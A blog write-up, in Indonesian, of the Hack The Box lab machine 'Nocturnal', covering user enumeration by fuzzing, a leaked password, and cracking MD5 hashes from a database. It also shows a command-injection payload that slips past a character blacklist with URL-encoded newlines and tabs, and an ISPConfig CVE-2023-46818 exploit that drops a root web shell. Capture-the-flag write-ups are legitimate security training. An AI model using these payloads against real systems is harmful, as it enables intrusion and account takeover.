---
layout: post
title: "HTB Writeup – Nocturnal"
date: 2025-04-13
image: /assets/machine/nocturnal/nocturnal.jpg
tags: [htb, linux, web]
excerpt: "CVE-2023-46818: exploit POST parameter to /admin/language_edit.php"
---

<center>
<img src="/assets/machine/nocturnal/nocturnal.jpg" class="img-post" />
</center>

# RECON

## Port Scan

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to Nocturnal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web

<center>
  <img src="/assets/machine/nocturnal/webnoc.jpg" class="img-post" />
</center>

Disini kita register lalu upload sembarangan file, dan lihat intercept burpsuite.

```bash
GET /view.php?username=hades&file=file.pdf HTTP/1.1
Host: nocturnal.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nocturnal.htb/dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=3if78g1uefu5ld57otpvgst9k5
Connection: keep-alive
```

Lihat di endpoint nya. Lalu kita Fuzz untuk melihat user apa saja yang ada.


# User

```bash
$ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=file.pdf' -w ../Desktop/fuzzDicts/userNameDict/user.txt -H 'Cookie: PHPSESSID=3if78g1uefu5ld57otpvgst9k5'  -fs 2985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=2023.xlsx
 :: Wordlist         : FUZZ: /home/hadespwnme/Desktop/fuzzDicts/userNameDict/user.txt
 :: Header           : Cookie: PHPSESSID=k381a2of6lftuk6gnab5f5sapa
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 72ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 70ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 69ms]
:: Progress: [8886/8886] :: Job [1/1] :: 335 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

Kita cek satu persatu ternyata **admin** dan **tobias** tidak memiliki file, sedangkan user dengan nama **amanda** terdapat file yang bernama **privacy.odt**.

```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

Kita bisa login ke backend menggunakan kredensial yang tersedia di surat.

Buat backup menggunakan password tadi, lalu kita bisa lihat ada **nocturnal_database.db**.

Download lalu Unzip, dan gunakan *Amanda* password.

```sql
(1,'admin','d725aeba143f575736b07e045d8ceebb');
(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
```

Crack hash tobias (karena tadi kita sudah tahu ada user apa saja, jadi coba terlebih dahulu, atau bisa gunakan md5 crack untuk langsung crack semua hash) diatas menggunakan *john*.

Login ssh dengan kredensial yang sudah kita dapat. Dan **Get The User Flag**.


## After Update

Setelah update, file database gak ada lagi, jadi kita bisa review code **admin.php**.

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='"a . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>
```

Dan kita bisa gunakan bypass dengan teknik url encoding.

```
POST /admin.php?view=dashboard.php HTTP/1.1
Host: nocturnal.htb
Content-Length: 108
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://nocturnal.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nocturnal.htb/admin.php?view=dashboard.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=eijjmosqk4m5ggpfg3fa7uosru
Connection: keep-alive

password=%0Abash%09-c%09"whoami"%0A&backup=
```

Dari sini kita bisa upload *revshell* dan mendapatkan file database.

# Root

Cek port yang terbuka.

```bash
tobias@nocturnal:~$ netstat -tupln
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                  
```

Terdapat port 8080 yang dapat kita tunnel.

Dan kita mendapatkan ISPConfig service.

<center>
  <img src="/assets/machine/nocturnal/ispconfig.png" class="img-post" />
</center>

## CVE-2023-46818

Kita bisa login menggunakan kredensial Tobias. Di panel *Help* kita bisa tau kalau versinya adalah **3.2**.

Setelah mencari kita dapat menggunakan POC [CVE-2023-46818](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)

```bash
$ python3 exploit.py http://127.0.0.1:8080 admin slowmotionapocalypse

[+] Logging in as 'admin'
[+] Login successful.
[+] Injecting PHP shell...
[+] Shell dropped at 'sh.php'
[+] Web shell ready. Type commands below. Ctrl+C or 'exit' to quit.

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted